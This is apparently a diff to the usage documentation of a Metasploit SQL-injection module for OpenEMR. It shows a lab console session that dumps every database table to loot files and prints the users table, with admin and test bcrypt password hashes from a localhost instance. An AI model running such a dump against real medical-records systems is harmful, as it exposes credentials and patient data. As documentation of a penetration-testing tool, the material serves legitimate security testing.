@@ -75,8 +75,24 @@ msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > run
 [*] Auxiliary module execution completed
 msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > exit
 
-root@localhost:/tmp# cd /root/.msf4/loot
-root@localhost:~/.msf4/loot# cat 20190904164551_default_127.0.0.1_openemr.db.users_659759.bin
+root@localhost:/# cd /root/.msf4/loot
+root@localhost:~/.msf4/loot# ls -l
+
+-rw-rw-r-- 1 root root   207 Sep 11 01:33 20190911013307_default_127.0.0.1_openemr.ALL_PLUG_118002.bin
+-rw-rw-r-- 1 root root    42 Sep 11 01:33 20190911013308_default_127.0.0.1_openemr.APPLICAB_752726.bin
+-rw-rw-r-- 1 root root    59 Sep 11 01:33 20190911013309_default_127.0.0.1_openemr.CHARACTE_047422.bin
+-rw-rw-r-- 1 root root    77 Sep 11 01:33 20190911013309_default_127.0.0.1_openemr.CHECK_CO_374587.bin
+-rw-rw-r-- 1 root root    68 Sep 11 01:33 20190911013310_default_127.0.0.1_openemr.COLLATIO_513047.bin
+
+...
+
+-rw-rw-r-- 1 root root    37 Sep 11 01:47 20190911014756_default_127.0.0.1_openemr.syndromi_322156.bin
+-rw-rw-r-- 1 root root     3 Sep 11 01:47 20190911014757_default_127.0.0.1_openemr.gacl_acl_006027.bin
+-rw-rw-r-- 1 root root    22 Sep 11 01:47 20190911014757_default_127.0.0.1_openemr.lang_con_639806.bin
+-rw-rw-r-- 1 root root   139 Sep 11 01:47 20190911014759_default_127.0.0.1_openemr.backgrou_037369.bin
+-rw-rw-r-- 1 root root  5462 Sep 11 01:48 20190911014846_default_127.0.0.1_openemr.geo_coun_668990.bin
+
+root@localhost:~/.msf4/loot# cat 20190911014115_default_127.0.0.1_openemr.users_se_735944.bin
 id,username,password,salt,last_update,password_history1,salt_history1,password_history2,salt_history2
 1,admin,$2a$05$bxcQWy1ZeIwV2/ScGBQlTOeUVqJo9MdvHuF1mBs4Jo7H0/bFpZoPK,$2a$05$bxcQWy1ZeIwV2/ScGBQlTZ$,2019-08-27 20:07:13,"","","",""
 4,johndoemsf,$2a$05$gUWCtnsoqPBbn5zKiasyaOphgJwkA9BySy7LnK3BswyWt0RrLb0Ma,$2a$05$gUWCtnsoqPBbn5zKiasyaQ$,2019-08-29 02:01:28,"","","",""
